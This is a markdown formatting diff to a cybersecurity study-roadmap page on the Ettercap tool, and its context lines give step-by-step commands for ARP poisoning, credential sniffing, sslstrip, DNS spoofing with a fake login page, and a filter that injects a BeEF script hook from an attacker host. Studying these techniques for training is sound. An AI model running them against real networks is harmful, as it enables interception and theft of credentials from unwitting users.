@@ -18,17 +18,17 @@
 > [[Cyber-Security/Roadmap/README|🏠 Master Roadmap]] · [[Cyber-Security/Roadmap/Tools/README|🔧 Tools Index]]
 
 | Packet Capture & Analysis | Traffic Crafting & Flooding | MitM & Interception | Network Discovery |
-|:--------------------------|:----------------------------|:--------------------|:------------------|
+| :-------------------------- | :---------------------------- | :-------------------- | :------------------ |
 | [[Wireshark\|🦈 Wireshark]] | [[Scapy\|📦 Scapy]] | [[Bettercap\|🕵️ Bettercap]] | [[Nmap\|🗺️ Nmap]] |
 | [[tcpdump\|📻 tcpdump]] | [[hping3\|🔨 hping3]] | **🐛 Ettercap** (you are here) | [[Netcat\|🔌 Netcat]] |
-| [[iperf3\|📶 iperf3]] | | [[Responder\|📡 Responder]] | [[OpenSSL\|🔒 OpenSSL]] |
+| [[iperf3\|📶 iperf3]] || [[Responder\|📡 Responder]] | [[OpenSSL\|🔒 OpenSSL]] |
 
 ---
 
 ## 📊 Progress Overview
 
 | Phase | Focus | Tasks | Est. Time |
-|:---:|:---|:---:|:---:|
+| :---: | :--- | :---: | :---: |
 | 1 | Fundamentals | 4 | 1–2 hours |
 | 2 | ARP Poisoning | 4 | 2–3 hours |
 | 3 | Sniffing and Capture | 3 | 1–2 hours |
@@ -37,7 +37,7 @@
 | 6 | Filters | 3 | 2–3 hours |
 | 7 | Practical Labs | 3 | 2–4 hours |
 | 8 | Mastery Challenges | 2 | 1–2 hours |
-| | **Total** | **25** | **~11–20 hours** |
+|| **Total** | **25** | **~11–20 hours** |
 
 ---
 
@@ -50,7 +50,7 @@
 - [ ] **Completed** · ⭐ Beginner · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Ettercap** | Older. C-based. GUI (GTK) + text UI. Plugin system. Less actively maintained. Struggled with modern HTTPS. |
 | **Bettercap** | Modern. Go-based. Web UI + interactive CLI. Modular. Actively maintained. Better HTTPS MITM. Wi-Fi support. |
 | **Why Learn Ettercap** | Industry courses (CEH, OSCP older materials). Lab environments. Understanding legacy tool references. Ettercap filters have unique capabilities. |
@@ -62,7 +62,7 @@
 - [ ] **Completed** · ⭐ Beginner · ⏱️ 5 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Kali** | Pre-installed. `ettercap --version`. |
 | **Install** | `apt install ettercap-text-only` (no GUI) or `ettercap-graphical` (GTK GUI). |
 
@@ -73,7 +73,7 @@
 - [ ] **Completed** · ⭐ Beginner · ⏱️ 10 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **GTK GUI** | `sudo ettercap -G` — graphical interface. |
 | **Text UI** | `sudo ettercap -T` — ncurses text interface. |
 | **Daemonized** | `sudo ettercap -D` — run as daemon. |
@@ -86,7 +86,7 @@
 - [ ] **Completed** · ⭐ Beginner · ⏱️ 5 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Enable** | `sudo sysctl -w net.ipv4.ip_forward=1`. Required before ARP poisoning or traffic will drop. |
 
 ---
@@ -100,7 +100,7 @@
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Steps** | `ettercap -G` → Sniff → Unified sniffing → Select interface. Hosts → Scan for Hosts. Hosts → Host list. Select victim → Add to Target 1. Select gateway → Add to Target 2. Mitm → ARP Poisoning → check "Sniff remote connections". Start Sniff. |
 
 ---
@@ -110,7 +110,7 @@
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Command** | `sudo ettercap -T -i eth0 -M arp:remote /victim_ip// /gateway_ip//`. |
 | **Format** | `-M arp:remote /target1// /target2//` — poison both (bidirectional). |
 | **Log** | `-w capture.pcap` — write captured packets. `-L logfile` — Ettercap log file. |
@@ -122,7 +122,7 @@
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 10 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **CLI** | `sudo ettercap -T -i eth0 -P arp_scan` — ARP scan plugin. Lists all hosts. |
 | **GUI** | Hosts → Scan for Hosts → Host List. |
 
@@ -133,7 +133,7 @@
 - [ ] **Completed** · ⭐ Beginner · ⏱️ 10 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Stop** | Ctrl+C (text mode). Mitm → Stop MITM (GUI). |
 | **Restore** | Ettercap sends correct ARP replies to restore tables when stopped. Always stop cleanly. |
 
@@ -148,7 +148,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Automatic** | Ettercap automatically parses and displays credentials from: HTTP, FTP, Telnet, IMAP, POP3, SMTP. Shows in terminal: `[HTTP] username:password`. |
 | **Save** | `-L /path/to/logfile` — save captured data. |
 
@@ -159,7 +159,7 @@
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 10 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Command** | `sudo ettercap -T -i eth0 -M arp:remote /victim// /gateway// -w capture.pcap`. |
 | **Analyze** | Open in Wireshark for detailed analysis. |
 
@@ -170,7 +170,7 @@
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 10 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Command** | `sudo ettercap -T -i eth0` — passive only, no MITM. Sniffs traffic that naturally passes through the interface (only effective on hubs or mirrored ports — not on modern switches). |
 
 ---
@@ -184,7 +184,7 @@
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **List** | `ettercap -P list` — list all available plugins. |
 | **Key Plugins** | `arp_scan`: scan network for hosts. `dns_spoof`: DNS spoofing (requires `/etc/ettercap/etter.dns` configuration). `sslstrip`: HTTPS downgrade. `search_promisc`: detect promiscuous mode NICs (find other sniffers). `repoison_arp`: re-poison more aggressively. |
 | **Run** | `-P plugin_name` on command line, or Plugins → Manage Plugins in GUI. |
@@ -196,7 +196,7 @@
 - [ ] **Completed** · ⭐ Beginner · ⏱️ 10 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Command** | `sudo ettercap -T -i eth0 -P arp_scan`. |
 | **Output** | Lists all active hosts: IP and MAC. |
 
@@ -207,7 +207,7 @@
 - [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Use** | Combined with ARP MITM. Downgrades HTTPS → HTTP. Works on non-HSTS sites. |
 | **Command** | `sudo ettercap -T -i eth0 -M arp:remote /victim// /gateway// -P sslstrip`. |
 | **Limitation** | HSTS and modern browsers make this largely ineffective against major sites. |
@@ -223,7 +223,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **File** | `/etc/ettercap/etter.dns`. |
 | **Entry** | `*.target.com A 192.168.1.50` — spoof all subdomains of target.com to attacker's IP. `target.com A 192.168.1.50`. `www.target.com A 192.168.1.50`. |
 | **PTR** | `192.168.1.50 PTR attacker.com` — reverse DNS spoof. |
@@ -235,7 +235,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Command** | `sudo ettercap -T -i eth0 -M arp:remote /victim// /gateway// -P dns_spoof`. |
 | **Verify** | On victim: `nslookup target.com` → returns attacker's IP. |
 
@@ -246,7 +246,7 @@
 - [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Workflow** | Configure etter.dns. Start Apache2/Python HTTP server on attacker with fake login page. DNS spoof → victim's browser resolves to attacker → fake page served → credentials captured. |
 
 ---
@@ -260,7 +260,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Filters** | Ettercap can modify packets in transit using a filter language. Write filter → compile → apply during MITM. |
 | **Language** | C-like syntax. `if (ip.proto == TCP && tcp.dst == 80) { replace("original", "modified"); }`. |
 | **Compile** | `etterfilter filter.ef -o filter.ef.bin`. |
@@ -273,7 +273,7 @@
 - [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 25 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Goal** | Inject JavaScript into HTTP responses for all browsed pages. |
 | **Filter** | `if (ip.proto == TCP && tcp.dst == 80 && search(DATA.data, "Content-Type: text/html")) { replace("</head>", "<script src='http://attacker/hook.js'></script></head>"); }`. |
 | **Use** | BeEF hook injection. Credential capture. Keylogging. |
@@ -285,7 +285,7 @@
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 10 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Drop Packets** | `if (ip.dst == "8.8.8.8") { kill(); }` — drop all DNS traffic to Google DNS (forces client to use other DNS or fail). |
 | **Use** | DoS specific connections. Block specific sites. Redirect DNS. |
 
@@ -347,7 +347,7 @@
 # 📋 FINAL COMPETENCY MATRIX
 
 | Competency | Self-Assessment |
-|:---|:---:|
+| :--- | :---: |
 | Can run Ettercap ARP poisoning via CLI and GUI | ☐ |
 | Can capture credentials from cleartext protocols | ☐ |
 | Can configure and run DNS spoofing with etter.dns | ☐ |
